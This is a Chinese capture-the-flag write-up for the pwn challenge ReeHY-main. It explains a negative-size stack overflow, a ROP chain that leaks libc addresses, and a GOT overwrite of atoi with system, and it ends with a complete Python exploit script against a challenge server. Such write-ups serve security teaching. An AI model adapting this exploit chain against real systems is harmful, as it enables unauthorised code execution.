
# 第四题 ReeHY-main Writeup

这道题可利用的点还蛮多的。常规的方式是利用堆释放的时候没有删除堆指针导致`UAF`来完成攻击。我使用的是另一个不同的点，具体如下。（第一次做pwn，可能有些错误的地方，望指正）

该程序对输入的编号都通过`itoa`函数进行转换，将字符串转为数字，具体实现在`sub_4005cc`函数中。

![](https://bbs.kanxue.com/upload/attach/201706/672665_ju5n8vfbhnguccr.png)

同样，用于创建堆块的“`Create Exploit`”选项中也调用了该函数，主要是将输入的堆大小（`Input size`）和堆序号（`Input cun`）转换为数字。

![](https://bbs.kanxue.com/upload/attach/201706/672665_simebeywm30qu1g.png)

当输入一个`size`时，这个`size`将作为用于限定输入内容长度的值传递到如下图的位置。

![](https://bbs.kanxue.com/upload/attach/201706/672665_5wyht6wbnlycbh7.png)

图中的`nbytes`就是输入的`size`。这里就存在一个问题，由于`sub_4005cc`函数并未对输入的`size`做限制，如果输入一个负值，那么传递一个负的`size`给`read`函数。而其实`read`函数的第三个参数接收到的是个`int`类型的值（忽略ida将它强转为`unsigned int`，其实它是个`int`值），如果输入的`size`是个负值，那么到达`read`时`size`将变为一个很大的值。这个函数为接收`read`内容的`buf`分配了`0x80`的大小，当`size`很大时将会导致栈溢出。而由于`read`的特性，当`read`函数接收到`EOF`时将终止接收，不管是不是达到`size`规定的大小，因此我们可以完全控制写入`buf`中数据的长度，使用栈溢出覆盖返回地址或覆盖其他变量的形式完成攻击。攻击份两步走，第一步是信息泄露，第二步是`getshell`。

## 1.信息泄露

要想`getshell`就必须拿到`system`函数的地址，因此需要通过一些方法泄露出该函数的地址。可惜，这个程序“`show exploit`”功能被阉割了，只输出“no no no”，因此需要自己想办法调用`puts`函数输出`GOT`表中某个函数的地址，然后根据偏移计算`system`函数的地址。之前提到我们可以实现栈溢出，因此可以修改返回地址，使执行流程转到“`show expliot`”中的`puts`函数处，并传递我们需要泄露的函数对应的`GOT`表位置，进行信息泄露。

由于程序开了`nx`保护，因此需要构造`ROP`链。从代码中我们发现，`puts`函数所接收的参数是存放在`rdi`寄存器中的。

![](https://bbs.kanxue.com/upload/attach/201706/672665_d9c2i19efvasrrc.png)

那么`ROP`链的流程应该是：将需要泄露的函的`GOT`表位置传递至`rdi`寄存器-->调用`0x400c4d`的`puts`函数-->返回主流程。首先需要找“`pop rdi, ret`”的地址，发现`0x400da3`位置处指令为“`pop rdi, ret`”，可利用。下一步找要泄露的函数的`GOT`表地址，我使用的是`atoi`函数，`GOT`表位置如下。

![](https://bbs.kanxue.com/upload/attach/201706/672665_g0657j1humpweng.png)

然后就是构造`ROP`，`ROP`链如下：

`0x400da3`（“`pop rdi, ret`”的地址）

`0x602058`（`atoi`函数`GOT`表地址）

`0x400c4d`（调用`puts`函数地址）

`0`（`puts`函数后有`pop`指令，这里用`0`占位保证栈平衡）

`0x400c8c`（主函数地址）

那么读入`buf`的内容就是

`2*'b'+126*'a'+l64(0x602058)+l32(0x1)+l32(0x0)+l64(0x0)+l64(0x400da3)+l64(0x602058)+l64(0x400c4d)+l64(0x0)+l64(0x400c8c)`

前面那些内容为了占位凑长度，使写入长度超过112，函数流程进入`read`到`buf`的流程，并且写入的内容超过`buf`的大小导致溢出。这些内容里面有些是为了保证局部变量不被破坏设定的，之后会提到。

这样就可以调用`puts`函数，并将`atoi`函数的`GOT`表地址传递给他作为参数，泄露出`atoi`函数在`libc`中的地址。

之后通过相应的偏移加减，就能得到`system`函数在`libc`中的地址。

## 2.getshell

我们在第一步已经获取`system`的地址了，这时候可以使用该地址替换`GOT`表中某个函数的地址，然后调用那个函数就等于调用了`system`函数。这里需要一个任意地址写的漏洞。

还是用的和第一步同样的地方，从上面贴出的代码截图可以看到，`read`函数后面跟随着`memcpy`函数，是将`buf`读到的内容传递给申请的堆中。我们看一下这段代码所在函数的局部变量分布。

![](https://bbs.kanxue.com/upload/attach/201706/672665_jxib1eshwwvgvqb.png)

不难发现，`buf`下方的局部变量分别为堆的地址`dest`，堆的编号`v3`，写入堆的内容长度`nbtes`。同样使用溢出`buf`的方法，可以控制`dest`，`v3`和`nbytes`。而`dest`和`nbytes`又是`read`下方`memcpy`函数的参数。

![](https://bbs.kanxue.com/upload/attach/201706/672665_g7t05sq83yuaxxo.png)

如此一来就可以往任意地址写任意长度的内容。我们将`dest`覆盖为`atoi`函数的`GOT`表地址，`nbytes`覆盖为`8`（`system`地址的长度），往`buf`的前八位写入`system`的地址，通过`memcpy`函数就可将`stoi`函数的地址替换为`system`函数的地址。写入`buf`的内容如下。

`p64(system_addr)+120*'a'+p64(0x602058)+p32(0x2)+p32(0x8)`

我们前面进行信息泄露的时候在写入`buf`的内容中的一些特定位置用了一些特殊的值，就是为了防止溢出时更改了`memcpy`的参数，导致出现异常。而这里恰恰相反，通过覆盖`memcpy`的参数进行任意地址写。

如此一来`GOT`表中`atoi`函数的地址就变为了`system`函数的地址，之后随便调用任何一处有调用`atoi`函数的地方（我使用的是主函数）就能`getshell`。

完整的`python`利用代码如下。（第一次搞`pwn`，`pwntools`和`zio`混用略尴尬，凑合看吧）

```
from zio import *

from pwn import *

import binascii

io=zio(('211.159.216.90',51888),timeout=100000)

#io.gdb_hint()

#io.read_until('break')

 

sc='1'

sc0='-100'

sc1=2*'b'+126*'a'+l64(0x602058)+l32(0x1)+l32(0x0)+l64(0x0)+l64(0x400da3)+l64(0x602058)+l64(0x400c4d)+l64(0x0)+l64(0x400c8c)

#sc1=l64(0x4006d0)+120*'a'+l64(0x602018)+l32(0x1)+l32(0x8)

io.read_until('$')

io.writeline(sc)

io.read_until('$')

io.writeline(sc)

io.read_until('\n')

io.writeline(sc0)

io.read_until('\n')

io.writeline(sc)

io.read_until('\n')

#io.gdb_hint()

io.writeline(sc1)

atoi_addr=u64(io.read(6)+2*'\x00')

libc_base=atoi_addr-0x36740

print hex(libc_base)

system_addr=libc_base+0x41fd0

sc2=p64(system_addr)+120*'a'+p64(0x602058)+p32(0x2)+p32(0x8)

payload='cat flag\0'

io.read_until('$')

io.writeline(sc)

io.read_until('$')

io.writeline(sc)

io.read_until('\n')

io.writeline(sc0)

io.read_until('\n')

io.writeline('2')

io.read_until('\n')

io.writeline(sc2)

io.read_until('$')

#io.gdb_hint()

io.write(payload)

io.readline()
```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
